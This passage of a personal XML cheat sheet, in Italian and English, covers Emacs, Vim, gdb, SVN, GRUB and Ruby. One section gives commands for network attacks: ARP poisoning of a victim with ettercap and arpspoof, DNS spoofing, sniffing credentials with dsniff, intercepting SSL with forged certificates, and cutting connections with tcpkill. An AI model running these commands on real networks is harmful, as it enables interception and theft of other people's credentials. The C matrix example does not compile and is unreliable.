        3. Look at the source in https://wiki.archlinux.org/index.php/Configuring_Network#Change_MAC.2Fhardware_address
    </item>
</dict>

<!--- ********************************* Emacs ***************************************** -->
<dict name="emacs">
    <item name="Help">
        Tutorial:<command name="Cntrl-h t"/>
        Manual:<command name="Cntrl-h r"/>
        Documentation with any key:<command name="Cntrl-h k"/>
        Documentation for command by name:<command name="Cntrl-h f"/>
        Search fo commands by keyword:<command name="Cntrl-h a"/>
    </item>

    <item name="Files">
        File chooser:
            <command name="M-x dired"/> or 
            <command name="C-x C-f"/>
        Save file:<command name="C-x C-s"/>
    </item>

    <item name="Misc">
        To apply Cntrl-c to the shell:<command name="C-q C-c RET"/>
    </item>

    <item name="Movement">
        Forward one char:<command name="C-f"/>
        Back one char:<command name="C-b"/>
        Next line:<command name="C-n"/>
        Previous line:<command name="C-p"/>

        Beginning of line:<command name="C-a"/>
        End of line:<command name="C-e"/>

        Beginning of buffer:<command name="M-&lt;"/>
        End of buffer:<command name="M-&gt;"/>

        Go to line:<command name="C-g g"/>
        
        To recovery from a crash or to erase a 
        keybindings sequence:<command name="C-g"/>
    </item>

    <item name="Search and replace">
        Incermental search forward:<command name="C-s"/>
        Go to next:<command name="C-s"/>
        Return the cursor back:<command name="C-r"/>
        Incermental search backward:<command name="C-r"/>
        
        Search and Replace:<command name="M-%"/>

        REGULAR EXPRESSION:
        Apply a re:<command name="C-M-s"/>
        Interactive:<command name="M-x re-builder"/>
        List occurrences:<command name="M-x occur"/>
        Replace with re:
            <command name="M-x replace-regexp"/>
            Then typing <code>\(\w+\) \(\w+\) with \,(upcase \2), \1</code>
            Exchange the words and the second one become uppercased.

    </item>

    <item name="Keyboard macro">
        Start record:<command name="F3"/>
        Stop record:<command name="F4"/>
        Play macro:<command name="F4"/>
    </item>

    <item name="Mark Yank kill undo">
        Set Mark:<command name="C-SPC"/>

        Cut line:<command name="C-k"/>
        Cut region:<command name="C-w"/>
        Copy region:<command name="M-w"/>

        Paste line or region:<command name="C-y"/>
        Undo:<command name="C-x u"/> or <command name="C-_"/>
    </item>


    <item name="Programming">
        Debugger:<command name="M-x gdb"/>
        Shell:<command name="M-x shell"/>
        For both shell and gdb use <command name="M-n"/> or <command name="M-p"/> to browse the history
        Terminal:<command name="M-x term"/>
        Shell Command:<command name="M-!"/> or 
            <command name="M-x shell-command"/>
        Man:<command name="M-x man"/>
        Grep:<command name="M-x grep"/>
        Calculator:<command name="M-x calculator"/>
        Calendar:<command name="M-x calendar"/>
    </item>
    <item name="Version Control">
        Commit:<command name="C-x v v"/>
        Displays diff you have made:<command name="C-x v ="/>
        Prompts for a version number:<command name="C-x v ~"/>
        Displays for each line the relative commit:
            <command name="C-x v g"/>
            Then, press L to know the log message for that commit
            or press D to show the diff
    </item>
    <item name="Major minor modes">
        List of major modes:
            <command name="M-x java-mode"/>
            <command name="M-x python-mode"/>
            <command name="M-x text-mode"/>
            <command name="M-x fundamental-mode"/>

        List of minor modes:
            <command name="M-x auto-fill-mode"/>
            <command name="M-x flyspell-mode"/>
            <command name="M-x follow-mode"/>
    </item>

    <item name="Manage windows">
        Leave the current window:<command name="C-x 1"/>
        Change window:<command name="C-x o"/>
        Create a window vertically:<command name="C-x 2"/>
        Create a window horizontally:<command name="C-x 3"/>
        Create a window and apply operation:<command name="C-x 4 ..."/>
            For example to send an email:<command name="C-x 4 m"/>

        Enlarge horizontally:<command name="C-x }"/>
        Shrink horizontally:<command name="C-x {"/>
        Enlarge vertically:<command name="C-x +"/>
        Shrink vertically:<command name="C-x -"/>
    </item>
    <item name="Dired">
        Open Dired:<command name="C-x d"/>
        Mark and Unmark:<command name="m u"/>
        Flag deletion file:<command name="d"/>
        Undo deletion file:<command name="u"/>
        Delete the files:<command name="x"/>
        Open on other window:<command name="o"/>
        Rename file:<command name="R"/>
        Copy file:<command name="C"/>
        Delete file:<command name="D"/>
        Chage mode file:<command name="M"/>
        Change owner file:<command name="O"/>
        Change group file:<command name="G"/>
        Touch file:<command name="T"/>
        Compress file:<command name="Z"/>
        Apply a shell command on a file:<command name="!"/>
        Diff files:<command name="="/>
        Update Dired buffer:<command name="g"/>
    </item>
</dict>

<!--- ********************************* Vi/Vim ***************************************** -->
<dict name="vi/vim">
<item name="lezione 1 - movimento">
			       Lezione 1 SOMMARIO


  1. Il cursore si muove usando i tasti con le frecce o i tasti hjkl.
	 h (sinistra)	j (giù)       k (su)	    l (destra)

  2. Per eseguire Vim dal PROMPT della Shell batti:  vim NOMEFILE INVIO

  3. Per uscire da Vim batti: &lt;ESC&gt; :q! &lt;INVIO&gt; per uscire senza salvare.
		oppure batti: &lt;ESC&gt; :wq &lt;INVIO&gt; per uscire salvando modifiche.

  4. Per cancellare il carattere sotto al cursore batti: x

  5. Per inserire testo subito prima del cursore batti:
	 i     batti testo inserito	&lt;ESC	inserisci prima del cursore
	 A     batti testo aggiunto	&lt;ESC&gt;	aggiungi a fine linea

NOTA: premendo &lt;ESC&gt; ritornerai in Modalità Normale o annullerai
      un comando errato che puoi aver inserito in parte.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
</item>
<item name="lezione 2 - cancellazione">
			       Lezione 2 SOMMARIO


  1. Per cancellare dal cursore fino alla parola seguente batti:      dw
  2. Per cancellare dal cursore fino alla fine della linea batti:     d$
  3. Per cancellare un'intera linea batti:    dd
  4. Per eseguire più volte un movimento, mettici davanti un numero:  2w
  5. Il formato per un comando di modifica è:

       operatore   [numero]   movimento
     dove:
       operatore - indica il da farsi, ad es.  d  per [delete] cancellare
       [numero]  - contatore facoltativo di ripetizione del movimento
       movimento - spostamento nel testo su cui operare, ad es.
       		   w [word] parola, $ (fino a fine linea), etc.

  6. Per andare a inizio linea usate uno zero:	0
  7. Per annullare i comandi precedenti, batti:	 	    u (u minuscola)
     Per annullare tutte le modifiche a una linea batti:    U (U maiuscola)
     Per annullare l'annullamento ["redo"]  	  batti:    CTRL-r

</item>
<item name="lezione 3 - paste, replace, change">
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
			       Lezione 3 SOMMARIO


  1. Per reinserire del testo appena cancellato, batti   p   .  Questo
     inserisce [pone] il testo cancellato DOPO il cursore (se era stata tolta
     una linea intera, questa verrà messa nella linea SOTTO il cursore).

  2. Per rimpiazzare il carattere sotto il cursore, batti   r   e poi il
     carattere che vuoi sostituire.

  3. L'operatore change ti permette di cambiare dal cursore fino a dove
     arriva il movimento.  Ad es. Batti  ce  per cambiare dal cursore
     fino alla fine della parola,  c$  per cambiare fino a fine linea.

  4. Il formato di  change  è:

       c   [numero]   movimento

</item>
<item name="lezione 4 - sostituzione, match, %, goto">
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
			       Lezione 4 SOMMARIO


1. CTRL-G  visualizza a che punto sei nel file e la situazione del file.
          G  [G Maiuscolo] ti porta all'ultima linea del file.
   numero G  ti porta alla linea con quel numero.
         gg  ti porta alla prima linea del file.

2. Battendo  /  seguito da una frase ricerca IN AVANTI quella frase.
   Battendo  ?  seguito da una frase ricerca ALL'INDIETRO quella frase.
   DOPO una ricerca batti    n   per trovare la prossima occorrenza nella
   stessa direzione, oppure  N   per cercare in direzione opposta.
   CTRL-O ti porta alla posizione precedente, CTRL-I a quella più nuova.

3. Battendo  %  mentre il cursore si trova su  (,),[,],{, oppure }
   ti posizioni sulla corrispondente parentesi.

4. Per sostituire "nuovo" al primo "vecchio" in 1 linea batti :s/vecchio/nuovo
   Per sostituire "nuovo" ad ogni  "vecchio" in 1 linea batti :s/vecchio/nuovo/g
   Per sostituire frasi tra 2 numeri di linea [#]  batti   :#,#s/vecchio/nuovo/g
   Per sostituire tutte le occorrenze nel file batti	     :%s/vecchio/nuovo/g
   Per chiedere conferma ogni volta aggiungi 'c'	    :%s/vecchio/nuovo/gc

</item>
<item name="lezione 5 - esecuzione comandi, selezione, leggere altri file">
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
			       Lezione 5 SOMMARIO


  1.  :!comando  esegue un comando esterno.

      Alcuni esempi utili sono [in MSDOS]:
	  :!dir		     -	visualizza lista directory
	  :!del NOMEFILE     -	cancella file NOMEFILE.

  2.  :w NOMEFILE  scrive su disco il file che stai editando con nome NOMEFILE.

  3.  v movimento :w NOMEFILE  salva le linee selezionate in maniera
      visuale nel file NOMEFILE.

  4.  :r NOMEFILE  legge il file NOMEFILE da disco e lo inserisce nel file
      che stai modificando, dopo la linea in cui è posizionato il cursore.

  5.  :r !dir  legge l'output del comando  dir  e lo inserisce dopo la
      linea in cui è posizionato il cursore.
</item>
<item name="lezione 6 - inserimento, copia incolla, set opzioni">
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		       Lezione 6 SOMMARIO

  1. Batti  o  per aggiungere una linea SOTTO il cursore ed entrare in
               Modalità Inserimento.
     Batti  O  per aggiungere una linea SOPRA il cursore.

  2. Batti  a  per inserire testo DOPO il cursore.
     Batti  A  per inserire testo alla fine della linea.

  3. Il comando   e  sposta il cursore alla fine di una parola.

  4. L'operatore  y  copia del testo,  p  incolla del testo.

  5. Batti  R  per entrare in Modalità Replace, e ne esci premendo &lt;ESC&gt;.

  6. Batti ":set xxx" per impostare l'opzione "xxx". Alcun opzioni sono:
      'ic' 'ignorecase'	ignorare maiuscole/minuscole nella ricerca
      'is' 'incsearch'	mostra occorrenze parziali durante una ricerca
      'hls' 'hlsearch'	evidenzia tutte le occorrenze di una ricerca
     Puoi usare sia il nome completo di un'opzione che quello abbreviato.

  7. Usa il prefisso "no" per annullare una opzione:   :set noic

</item>
<item name="lezione 7 - ">
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
			   Lezione 7 Sommario


  1. Batti  :help  o premi &lt;F1&gt; o &lt;Help&gt;  per aprire una finestra di aiuto.

  2. Batti  :help comando  per avere aiuto su  comando .

  3. Batti  CTRL-W CTRL-W  per saltare alla prossima finestra.

  4. Batti  :q  per chiudere la finestra di aiuto.

  5. Crea uno script iniziale vimrc contenente le tue impostazioni preferite.

  6. Mentre batti un comando  : , premi CTRL-D per vedere i possibili
     completamenti.  Premi &lt;TAB&gt; per usare il completamento desiderato.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
</item>
</dict>

<!--- ********************************** HTML & CSS ***************************************** -->
<dict name="html &amp; css">
    <item name="list of the main HTML tag">
        <![CDATA[line break: <br/>
        horizontal line: <hr/>
        image: <img src=""/>
        link: <a href="http://...">Hello</a>
            CSS element for a tag are: a:link a:visited a:hover
        paragraph: <p></p>
        span(make bold): <span></span>
        head line: <h1></h1>
        style(allow to add all CSS prop): <style></style>
        ]]>
    </item>
    <item name="list of CSS properties">
        <![CDATA[
        You can use it in something like this:
        <div style="background:green;width60px">
        </div>

        background -> 
        width -> size of the div
        height -> size of the div
        position -> could be "absolute" or "relative"
        top -> distance from the top
        left -> distance from the left
        border -> define prop of the border div. Example
        style="border: 10px solid orange"
        text-align -> center,left..
        text-indent -> indentation (px)
        font-size -> dimension of the font (px)
        font-family -> arial,..
        font-weight -> bold,
        font-style -> italic,
        padding -> define the distance (px) from the border 
        margin -> define the distance of the div from the other object of the page
        margin-top -> same but only for top
        margin-left -> same but only for left
        min-height -> define the min height of a element
        max-height -> define the max height of a element
        text-decoration -> if it's none disable of possible decoration like underlinyng, bold etc..
        ]]>
       
    </item>
    <item name="identificator of class,id and element in a CSS file">
        <![CDATA[
        To reference a class:
        <div class="foo"></div>
        in CSS:
        .foo{
        color:red
        }

        To reference a id:
        <div id="foo"></div>
        in CSS
        #foo{
        color:orange
        }

        To reference any element in a CSS file:
        div, h1, body{
        border: 1px solid
        }

        To reference all possible tag of the page:
        *{
        border:orange
        }
        ]]>

    </item>
</dict>




<!--- ********************************** FORTRAN ***************************************** -->
<dict name="FORTRAN">

<item name="Utili opzioni del comando gfortran">
Opzioni:
    * -g - consente di aggiungere simboli per il debugging
    * -fmax-stack-var-size=n - Permette di impostare la dimensione dello stack. Porre n in base alla dimensione dei dati del programma.
    * -frecursive - Utile per funzioni ricorsive e per l'esecuzione di programmi in parallelo.
</item>
</dict>

<!--- ********************************** GDB - GNU DEBUGGER ***************************************** -->
<dict name="GDB - GNU DEBUGGER">

<item name="gdb - gnu debugger">
Step1)La prima operazione da compiere e' specificare al compilatore di applicare i simboli di debug al oggetto compilato:<command name="gcc/gfortran -g file[.c/.f90]"/>
Step 2) lancia dbg:<command name="dbg file[.c/.f90]"/>
Step 3) Comandi all'interno di dbg sono:
    * break[b] num - applica un breakpoint ad un numero
        or you can use break[b] filename.c:num
    * run[r] - Esegue il programma
    * print[p] var - Stampa una variabile
    * continue[c] - Esegue fino al prossimo breakpoint
    * next[n] - Esegue fino alla prossima linea
    * step[s] - Come n però va anche all'interno della funzione
    * list[l] - Lista la porzione di codice corrente da eseguire
    * backtrack[bt] - Stampa lo stack di esecuzione
    * help - Aiuto
    * quit[q] - Esci
</item>
<item name="gdb - gnu debugger avanzato">
I comandi avanzati sono:
    * x/nfu addr - consente di esaminare dettagliatamente la memoria specificando l'indirizzo addr. Addr può anche essere un registro del processore ad es. per mostrare il contenuto di quattro byte in esadecimale sullo stack pointer x/4wx $sp
        Le opzioni sono:
        *   u - Indica la unità minima da visualizzare (es. x/ub per visualizzare un byte). I possibili valori sono: b(byte), h(halfwords,due bytes),w(word,quattro bytes)
        *   n - Indica la quantità di unità espresse in u da visualizzare (es. x/8ub)
        *   f - Indica il formato che può essere: s (stringa), i (traduce il codice in istruzione macchina) e x (esadecimale)
    * disassemble addr_in addr_fin - Traduce un range di memoria nel corrispondente codice macchina. Utile quando si vuole conoscere il codice macchina di un intero programma.
Per maggiori dettagli su come esaminare i dati di un programma visitare: http://www.it.uom.gr/teaching/gcc_manuals/onlinedocs/gdb_9.html


Come determinare gli indirizzi a partire dai simboli del programma:
        * info - comando indispensabile.
                info address "symb" - Determina l'indirizzo di symb
                info symbol "addr" - Stampa il simbolo memorizzato in addr
                info variables "regex" - Stampa le variabili eccetto quelle locali
                info scope "location" - Stampa tutte le variabili locali di uno scope. location può essere una funzione, indirizzo, linea di codice.
                info source - Fornisce informazioni su file sorgente: linguaggio, numero linee, etc..
Per maggiori informazioni sul comando info visitare: http://www.it.uom.gr/teaching/gcc_manuals/onlinedocs/gdb_14.html#SEC152
</item>

<item name="cuda-gdb">
    IMPORTANT: thing is that you have to specify the device in the code 
    you want to test with <code>cudaSetDevice(0)</code>.

    GET FOCUS: 
    To get or set a focus use:<command name="cuda thread [num]"/>.
    The same you can do with other target: kernel, grid, block, device, warp, ...
    GET INFO:
    To know information use: <command name="info cuda target [filter]"/>
    target can be devices, sms, warps, lanes, kernels, blocks, threads.
    the most important filter are device n, warp n, block x[,y], thread x[,y]

    AUTOSTEP:
    To apply an auto step on a section of code:<command name="autostep [num] for length lines"/>.
    The rest of the program will be executed normally.

    TIPS:
        Apply breakpoint on every kernel:<command name="set cuda break_on_launch application"/>
        Disable memcheck:<command name="set cuda memcheck off"/>
        Disable coalescing:<command name="set cuda coalescing off"/>
</item>

</dict>
<!--- ********************************** SVN - SUBVERSION ***************************** -->
<dict name="svn - subversion">
<item name="svn - semplice">
Le operazioni classiche compiute normalmente sono:
Aggiornare la copia locale alla revisione più recente<command name="svn update"/>
Commit della copia locale<command name="svn commit"/>
Aggiungere file nella copia locale per aggiornare il contenuto della cartella .svn<command name="svn add file"/>
Rimuovere file nella copia locale per aggiornare il contenuto della cartella .svn<command name="svn remove file"/>

</item>

<item name="svn - avanzato">

Regredire ad una versione già “committed”<command name="svn merge -c -REV"/>dove REV è il numero di revisione che si intende recuperare.

Comprimere una directory escludendo i metadati SVN<command name="tar cvf sdk.tar --exclude=\.svn sdk/"/>

Eliminare gli spazi bianchi nel nome del file<command name="svn st | awk '{if ($1 ~ &quot;?&quot;) print $2}' | xargs svn add"/>

Rimuovere spazi o tabulazioni alla fine della riga<command name="sed 's/[ \t]*$//' file1 > file2"/>

Inviare SVN diff verso Meld<command name="svn diff --diff-cmd='meld' -r 100:BASE FILE"/>

per visualizzare cosa è cambiato dalla versione “BASE” alla revisione “100″

Quanti file ci sono nel repository SVN?<command name="svn log -v --xml file:///path/to/rep | grep kind=\&quot;file\&quot;|wc -l"/>

Accedere ad un repository SVN su una porta differente
Editare il file di configurazione<command name="/home/cicciobomba/.subversion/config"/>e sotto la sezione [tunnels] aggiungere questa linea ciccio_diverso = /usr/bin/ssh -p 12345
Adesso è possibile accedere al repository SVN tramite SSH sulla porta 12345 scrivendo<command name="sudo svn co svn+ ciccio_diverso://root@192.168.50.51/svn-repo/progettino"/>

Rimozione ricorsiva delle directory .svn. Questo comando l’ho sempre usato per eliminare i file “compilati” di Python<command name="find . -name &quot;*.pyc&quot; -exec rm '{}' ';"/>, ma può essere usato anche per eliminare le directory “.svn”<command name="find -name .svn -delete"/>

Evitare le directory .svn usando find<command name="find . -name .svn -prune -o -print"/>

</item>
</dict>
<!--- ********************************** MAN IN THE MIDDLE/SNIFFING ***************************** -->
<dict name="man in the middle(mitm)/sniffing">
    <item name="sysctl">
        To displays all the output(parameters):<command name="sysctl -a"/>
        To do changes with the appropriate command:<command name="sudo sysctl -w parameter=value"/>
        For example:<command name="sudo sysctl -w net.ipv4.ip_forward=1"/>
        To load the value into kernel and become live:<command name="sysctl -a"/>

    </item>

    <item name="ettercap - mitm">
        Non c'è bisogno di abilitare l'inoltro ip ma basta semplicemente eseguire il comando
        dopo la config di /etc/etter.conf
        <command name="sudo ettercap -Tqi wlan0 -M arp:remote /VICTIM/ /GW/"/>
        ATTENZIONE: Non provare SSL utilizando il bridged mode in quanto non funziona.
        ATTENZIONE: Non usare ip_forward=1 in quanto si rischierebbe di inviare duplicati(Vedere la descrizione di man ettercap per ulterior dettagli).
        ATTENZIONE: Assicurarsi di avere installato iptables altrimenti non funzionerebbe il forward.

        To check if ARP poison is working well try:<command name="arp -a"/>
    </item>
    <item name="ettercap - dns_spoof">
        Modifica il file /usr/share/ettercap/etter.dns inserendo una regola del tipo:
        * A 127.0.0.1 per inoltrare tutti i dns al localhost
        Attivare il plugin dns_spoof
    </item>
    <item name="ettercap - remote_browser">
        Serve per conoscere le pagine visitate dall'utente.
        Specificare il browser da usare su /etc/etter.conf
    </item>

<item name="man in the middle (mitm)">
    Per abilitare l'inoltro dei pacchetti fare in questo modo (da non utilizzare con il comando fragrouter):<command name="echo 1 &gt; /proc/sys/net/ipv4/ip-forward"/>
    Se non funziona provare:<command name="sudo sysctl -w net.ipv4.ip_forward=0"/>

La prima operazione da fare è il comando arpspoof. Consideriamo i seguenti IP: IP_VICTIM è l'IP della vittima e IP_SERVER.
I comandi da eseguire sono:<command name="arpspoof -t IP_VICTIM IP_SERVER"/> e <command name="arpspoof -t IP_SERVER IP_VICTIM"/>

La successiva operazione è fare in modo che il mitm possa inoltrare effettivamente i pacchetti in transito:<command name="fragrouter -B1"/>
</item>

<item name="sniffing">
Questa è un operazione che va fatta una volta che il pc è in mitm!!
Il comando capace di sniffare user e pass di moltissimi protocolli è:<command name="dsniff -i eth0 -md"/>
L'opzione -m consente il controllo automatico dei protocolli e -d è il debugging mode.
Un'altro comando che spesso viene adoperato è:<command name="ngrep host IP"/>
Dove IP è l'indirizzo IP della vittima.

Gli comandi di sniffing sono:
Sniffa mail e li pone in output ben formattati:<command name="mailsnarf"/>
Sniffa URL:<command name="urlsnarf"/>
Sniffa messaggi su IRC, MSN etc:<command name="msgsnarf"/>
Sniffa file su NFS:<command name="filesnarf"/>
Manda gli URL sniffati al proprio browser locale:<command name="webspy"/>
</item>

<item name="SSL mitm">
Questa è un operazione che va fatta una volta che il pc è in mitm!!
Questa procedura consente di ottenere falsificare i certificati che vengono trasmessi via HTTP, POP, SMTP o qualunque altro protocollo che si poggia sul SSL.
La prima operazione è redirezionare il traffico HTTP/HTTPS tramite:<command name="dnsspoof"/>
Successivamente occorre falsificare il certificato tramite il comando:<command name="webmitm"/>
A questo punto il comando webmitm restituirà il falso certificato (webmitm.crt) che potrà essere utilizzato per decifrare il traffico SSL sniffato tramite wireshark (ethereal) e posto in un file.
Quindi:<command name="ssldump -r ozzy -k webmitm.crt -d > outozzy"/>
con -r specifichiamo il dumpfile, -k è la chiave, -d indica di decifrare i dati
Rimane solo da interpretare i dati ormai decifrati:<command name="cat outozzy | grep ??"/>
In grep si può mettere qualcosa che possa filtrare i dati in modo da ottenere più facilmente i dati sensibili. Per esempio si può inserire il nome di qualche tag html vicino ai dati sensibili.

</item>

<item name="kill and slow down connection with tcpkill and tcpnice">
Se vogliamo chiudere le connessioni TCP su porta 22 (SSH):<command name="tcpkill -i eth0 tcp port 22"/>
If you want to kill all the connections but not for a pecified host:<command name="sudo tcpkill -i wlan0 -9 not host 192.168.1.109"/>
Se vogliamo rallentare una connessione TCP iniettando pacchetti che avvisano di una finestra di ricezione piccola o pacchetti ICMP:<command name="tcpnice -i eth0 tcp port 22"/>
To slow down all the connection but not for a specified host:<command name="sudo tcpnice -i wlan0 not host 192.168.1.109"/>
</item>

</dict>
<!--- ********************************** C ***************************************** -->
<dict name="c">

<item name="Allocazione dinamica della memoria (DMA) per matrici bi-dimensionali">

<code>
#include &lt;stdio.h&gt;
#include &lt;malloc.h&gt;

int** new_int_matrix(int size_x, int size_y)
{
    int** matrix;
    matrix = calloc(size_x, 1+sizeof(int*)); // alloc one extra ptr
    int i
    for(i = 0,i&lt;size_x; i++) {
        matrix[i] = calloc(size_y, sizeof(int));
    }
    matrix[size_x] = NULL; // set the extra ptr to NULL

    return matrix;
}

void free_mem(int** matrix){
    // keep looping until you find the NULL one
    int i;
    for(i=0; matrix[i] != NULL; i++ ) {
        free( matrix[i] );
    }
    free( matrix );

}

void main(){
    int** first_matrix = new_int_matrix(1000,1000);

    int i;
    for(i = 0;i&lt;1000;i++) {
        int j;
        for(j = 0;j&lt;1000;j++) {
            first_matrix[i][j] = i*10+j;
        }
}

printf("9:3 %d - 4:6 %d \n", first_matrix[9][3], first_matrix[4][6]);
free_mem(first_matrix);
}
</code>
</item>
</dict>

<!--- ********************************** HISTORY ***************************************** -->
<dict name="history">
<item name="history">
Permette di visualizzare lo storico dei comandi. -c cancella tutto, num indica il num di comandi da visualizzare. il file è denominato .bash_history ed è localizzato nella dir home dell'utente : <command name="history [-c] [num]"/>
</item>
<item name="!?string">
Si riferisce al più recente comando contenente la string: <command name="!?string"/>
</item>
<item name="![num or string]">
Si riferisce al comando nella riga num (num può anche essere negativo) o che inizia per &quot;string&quot;: <command name="!n"/>
</item>
<item name="^string1^string2">
Sostituisce string1 con string2 nel precedente comando: <command name="^string1^string2^"/>
</item>
</dict>

<!--- ********************************** TRAFFIC CONTROL ***************************************** -->
<dict name="traffic control">

<item name="tc">
Il comando tc serve alla configurazione del traffico in ingresso e uscita di una interfaccia di rete attraverso tecniche di shaping, scheduling, accodamento, etc..

Per rimuovere il qdisc esistente: <command name="tc qdisc del dev $eth root"/>
Per mostrare il qdisc esistente: <command name="tc -s qdisc show dev $eth"/>
</item>

</dict>

<!--- ********************************** Ripristino e installazione di sistemi GNU/Linux ***************************************** -->
<dict name="Ripristino e installazione di sistemi GNU/Linux">

<item name="Opzioni di avvio del kernel">
Per conoscere tutte le opzioni al time boot: <command name="man bootparam"/>
</item>

<item name="Installare ubuntu senza cd ma solo con la iso">
Per prima cosa, scaricare l’immagine ISO di Ubuntu e posizionatela nella root directory (“/”), adesso digitate:
<command name="sudo gedit /boot/grub/grub.cfg"/>

A fine file aggiungete il seguente codice:
<code>menuentry "Ubuntu 10.04 desktop" {
loopback loop /ubuntu-10.04-desktop-i386.iso
linux (loop)/casper/vmlinuz boot=casper iso-scan/filename=/ubuntu-10.04-desktop-i386.iso noeject noprompt –
initrd (loop)/casper/initrd.lz
}</code>
Adesso riavviate il sistema e troverete nel grub la voce “Ubuntu”, selezionatela e….partirà l’installazione di Ubuntu 10.04 :)
</item>

<item name="Installare Grub nel MBR e in un'altra partizione utilizzando chainloader">
    Entrare in gurb con privilegi di root:<command name="sudo grub"/>
    Per conoscere la partizione in cui è installato il proprio GRUB:<command name="find /boot/grub/stage1"/>
    Dal risultato ottenuto definire che quella partizione è la partizione principale<commanf name="root (hd0,0)"/>

    Installare il grub nel MBR:<command name="setup (hd0)"/>
    E per la partizione:<command name="setup (hd0,0)"/>
</item>

<item name="elenco pacchetti installati">

1) Creare una lista dei pacchetti installati con il seguente comando:
#   dpkg --get-selections > /home/$USER/lista_pacchetti

2) E' buona norma salvare anche il file /etc/apt/sources.list

3) Per ripristinare i pacchetti sistemiamo il sources.list salvato in precedenza

4) Successivamente diamo da terminale:
#   sudo dpkg --set-selections (simbolo minore) /home/$USER/lista_pacchetti
#   sudo apt-get dselect-upgrade 

</item>


<item name="scrittura mbr">

1)si va in fdisk a cambiare il flag in modo tale che la partizione di linux sia bootable (#fdisk /dev/sda; poi digita a; poi digita la partizione )
2)si utilizza il CD live di ubuntu per esmpio cambiando le opzioni di boot (es root=/dev/sda2 eliminare il parametro boot=casper)
3)una volta avviato il SO scrivere su terminale sudo grub-install /dev/sda 

In caso di errori del tipo error: no such disk quando si intende avviare XP provare con i seguenti comandi:
# update-grub
# grub-install /dev/sda

</item>


</dict>
<!-- *********************************** RUBY ***************************************** -->
<dict name="ruby">
    <item name="Basics">
        To import modules:<code>require 'mechanize'</code>

        To install a new package:<code>gem install rails --version 3.0.1</code>
        To update the gem package manager:<code>gem update --system</code>
        Symbols are immutable strings:
        <code>
            symb = :rails
            :rails.to_s
        </code>
        Print
        <code>
            puts "name"  # print with \n
            print "name" # print without \n
            p :name  # equal to puts :name.inspect
        </code>

        The value nil correspond to None in python.
        
        Array:
        <code>
            x = [1,'two',:three]
            x[1] == 'two'
            x[0..2] == [1, 'two']
            x.length == 3
            a &lt;&lt; 7 # append 7 to a
            %w[0 3 4 5fsad] # create a array of string
        </code>
        
        Ranges:
        <code>
            0..9
            (0..9).to_a
            ('a'..'e').to_a
            => ["a", "b", "c", "e"]
        </code>
        Hash:
        <code>
            w = {'a'=>1, :b=>[2,3]}
            w.keys == ['a', :b]
            w = Hash.new(0) # default value for nonexistring key
            w[:foo] # it returns 0
        </code>

        Methods:
        <code>
            def foo(x,y=10)
                return [x, y+1]  # last exp returned as result.
            end
        </code>

        if and while:
        <code>
            if cond
               stat
            elsif
               stat
            else
               stat
            end

            while cond
               stat
            end
        </code>
    </item>
    <item name="string &amp; regular expression">
        All this types are available:
        <code>"string", %Q{string},'string',%q{string}</code>
        The concatenation a=41; "The answer is #{a+1}"

        Useful string methods:
        <code>
            s.chomp('s')   # wipe out the last char
            s.gsub(//, '')  # substitute the occurrence with a new string
        </code>

        All this types are available for regex:
        <code>/(.*)$/i, %r{(.*)$}i, Regexp.new('(.*)$', Regexp::IGNORECASE)</code>
        Matching regexp: "fox@berkeley.EDU" ~= /(.*)@(.*)\.edu$/i
        return false if no match, otherwise return true and $1..$n catch the groups.

        Replacing a substring:
            s.gsub(/s$/, '')
    </item>
    <item name="conversions &amp; more">
        <code>
            l.to_a # convert an Enumerable in Array
            s.to_s # convert in string
            s.to_sym # convert in symbol
        </code>
    </item>

    <item name="method call and operators" >
        To get all methods of an object:<code>57.methods</code>
        Every operator is a method call:<code>1+2 correspond to 1.send(:+, 2)</code>

        To append element into a list:<code>y &lt;&lt; [6,7] </code>
    </item>
    <item name="oop">
        Creation of an object: <code>ClassName.new(...)</code>
        Instance variable: <code>@variable</code>
        Class (static) variable: <code>@@variable</code>
        Class method:
        <code>
            def self.bank_name
               @@bank_name
            end
        </code>

    </item>

    <item name="metaprogramming">
        Generate accessor methods:<code>attr_accessor :balance</code>
        Add methods REOPENING a class:
        <code>
            class Numeric
            def euros
                self * 1.3
                end
        </code>
        If a method doesn't exist ruby call a special method:
        <code>
            class Numeric
              def method_missing(method_id)
                if method_id.to_s == 'euro'
                  self.send('euros')
                else
                  super
                end
              end
              end


              # Or in this way useful for both module and class
              Enumerable.class_eval do
                def palindrome?
                    return (self.is_a? Array) ? self.reverse == self : self.to_a.palindrome?
                end
              end
        </code>
    </item>
    <item name="iterator">
        Loops:
        <code>
            # Possible way to iterate across the elements
            list.each do |string|
               puts string
            end

            for i in (1..10) do
              puts i
            end

            1.upto 10 do |num|
              puts num
            end

            3.times{print "ciao"}

            # Map is the same of map in python
            x.map do |f|
              fruit.reverse
            end.sort

            # Select correspond the same of filter in python
            x.select do |el|
              el =~ /^[aeuio]/i
            end

            x.collect {|f| f.include?('e')}
            x.any?{|f| f.lenght>5}
        </code>
        Hash
        <code>
            hsh.each_key do |k| ... end
            hsh.each_pair do |k,v| ... end
        </code>
    </item>
    <item name="duck typing">
        Similar to interface in Java:
        <code>
            class Account
                include Comparable
                def &lt;=>(other)
                    self.balance &lt;=> other.balance
                end
            end
        </code>
        
        Enumerable respond a lot of methods!!: each, all? any? 
        collect, find, include?, inject, map, partition,...

    </item>
    <item name="yield">
        It's the same concept as in python.
        <code>
            # yield function is:
            def around_stuff
              ..before..
              yield
              ..after..
            end

            # in user code
            ...
            around_stuff do 
               my_stuff()
            end
            # so yield will be replaced with the function my_stuff()
        </code>
    </item>
</dict>

